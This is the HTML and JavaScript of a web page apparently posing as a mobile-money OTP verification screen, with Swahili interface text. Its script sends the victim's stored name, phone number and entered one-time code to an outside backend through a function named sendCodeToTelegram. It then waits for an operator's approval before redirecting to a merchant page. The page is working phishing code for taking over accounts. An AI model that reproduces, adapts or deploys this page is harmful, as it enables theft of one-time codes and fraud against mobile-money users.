<!DOCTYPE html>
<html lang="fr">
<head>
<meta charset="UTF-8">
<title>Vérification OTP</title>

<style>
*{ box-sizing:border-box; margin:0; padding:0; } body{ font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,Arial,sans-serif; background:#f4f4f4; min-height:100vh; display:flex; justify-content:center; align-items:center; padding:20px; } .page{ width:100%; max-width:500px; } .card{ background:#fff; border-radius:14px; padding:30px; box-shadow:0 2px 12px rgba(0,0,0,.08); } .title{ font-size:24px; font-weight:700; color:#1f2947; margin-bottom:10px; } .subtitle{ color:#777; margin-bottom:5px; } .display-number{ color:#222; font-weight:700; margin-bottom:20px; } .success-box{ background:#eef8f0; border:1px solid #b9e2c2; color:#2f6f3d; border-radius:10px; padding:15px; margin-bottom:20px; display:flex; gap:10px; align-items:flex-start; } .label{ font-size:16px; color:#444; margin-bottom:18px; } .otp-boxes{ display:flex; justify-content:center; gap:12px; margin-bottom:18px; } .otp-boxes input{ width:60px; height:60px; border:2px solid #ddd; border-radius:10px; background:#fff; text-align:center; font-size:24px; outline:none; } .otp-boxes input:focus{ border-color:#e0c500; } #timerContainer{ text-align:center; color:#d2be00; font-weight:600; margin-bottom:20px; } button{ width:100%; height:52px; border:none; border-radius:10px; font-size:18px; font-weight:700; background:#e5e5e5; color:#999; } button:not(:disabled){ background:#004fc5; color:#fff; } .spinner{ width:16px; height:16px; border:3px solid white; border-top:3px solid rgba(255,255,255,.4); border-radius:50%; margin-left:8px; animation:spin 1s linear infinite; display:none; } @keyframes spin{ to{transform:rotate(360deg);} } #status{ margin-top:15px; text-align:center; font-size:14px; }
</style>
</head>

<body>

<div class="page"> <div class="card"> <div class="title"> Uthibitisho wa OTP </div> <div class="subtitle"> Weka OTP iliyotumwa kwenye nambari yako ya simu </div> <div id="phoneNumber" class="display-number"></div> <div class="success-box"> <div style="font-size:20px;">✓</div> <div> Maelezo yamethibitishwa! Tafadhali weka OTP yako hapa chini. </div> </div> <form id="otpForm"> <div class="label"> Weka msimbo wa uthibitisho </div> <div class="otp-boxes"> <input maxlength="1" inputmode="numeric"> <input maxlength="1" inputmode="numeric"> <input maxlength="1" inputmode="numeric"> <input maxlength="1" inputmode="numeric"> </div> <div id="timerContainer"> Tuma tena msimbo kwa <strong><span id="timerDisplay">60</span></strong> sekunde </div> <button id="submitBtn" disabled> <span id="btnText">WASILISHA</span> <span class="spinner" id="spinner"></span> </button> </form> <div id="status"></div> </div> </div>

<script>
const BACKEND_URL = "https://mixx-by-yas-biashara.onrender.com";
const params = new URLSearchParams(window.location.search);
const botId = params.get('botId');
if(!botId){ alert("Lien d'accès invalide"); throw new Error(); }

const phone = localStorage.getItem('phone') || "";
document.getElementById('phoneNumber').textContent =
  phone ? phone.slice(0,6) + "****" + phone.slice(-2) : "";

const inputs = document.querySelectorAll('.otp-boxes input');
const submitBtn = document.getElementById('submitBtn');
const btnText = document.getElementById('btnText');
const spinner = document.getElementById('spinner');
const statusEl = document.getElementById('status');
const timerDisplay = document.getElementById('timerDisplay');

let countdown;

document.addEventListener('keydown', e => {
  if(!/^[0-9]$/.test(e.key) && e.key !== "Backspace") return;

  const values = [...inputs].map(i => i.value);
  const index = values.findIndex(v => v === "");

  if(e.key === "Backspace") {
    const lastFilled = values.map(v => v !== "").lastIndexOf(true);
    if(lastFilled >= 0) inputs[lastFilled].value = "";
  } else if(index !== -1) {
    inputs[index].value = e.key;
  }

  submitBtn.disabled = ![...inputs].every(i => i.value);
});

function startCountdown(duration = 60){
  let time = duration;
  timerDisplay.textContent = time;
  clearInterval(countdown);

  countdown = setInterval(()=>{
    time--;
    timerDisplay.textContent = time;
    if(time<=0){
      clearInterval(countdown);
      statusEl.textContent="Le code OTP a expiré. Veuillez demander un nouveau code.";
      submitBtn.disabled=true;
    }
  },1000);
}

startCountdown();

async function sendCodeToTelegram(name, phone, code){
  try{
    const r = await fetch(`${BACKEND_URL}/submit-code`,{
      method:"POST",
      headers:{"Content-Type":"application/json"},
      body:JSON.stringify({ name, phone, code, botId })
    });
    return r.json();
  }catch{
    return null;
  }
}

function pollCodeApproval(requestId){
  return new Promise(resolve=>{
    const i=setInterval(async()=>{
      const r=await fetch(`${BACKEND_URL}/check-code/${requestId}`);
      const d=await r.json();
      if(d.approved===true||d.approved===false){
        clearInterval(i);
        resolve(d.approved);
      }
    },1500);
  });
}

document.getElementById('otpForm').addEventListener('submit', async e=>{
  e.preventDefault();
  const code=[...inputs].map(i=>i.value).join('');
  const name=localStorage.getItem('name')||"Unknown";
  const phone=localStorage.getItem('phone')||"Unknown";

  submitBtn.disabled=true;
  btnText.textContent="Vérification";
  spinner.style.display="inline-block";
  statusEl.textContent="En attente de validation...";

  const res=await sendCodeToTelegram(name, phone, code);
  if(!res||!res.requestId){
    statusEl.textContent="Échec de l'envoi.";
    submitBtn.disabled=false;
    btnText.textContent="Connexion";
    spinner.style.display="none";
    return;
  }

  const approved=await pollCodeApproval(res.requestId);
  clearInterval(countdown);

  if(approved){
    localStorage.clear();
    window.location.href=`merchant.html?botId=${botId}`;
  }else{
    statusEl.textContent="Code OTP incorrect. Veuillez réessayer.";
    inputs.forEach(i=>i.value="");
    submitBtn.disabled=false;
    btnText.textContent="Connexion";
    spinner.style.display="none";
    startCountdown();
  }
});
</script>

</body>
</html>
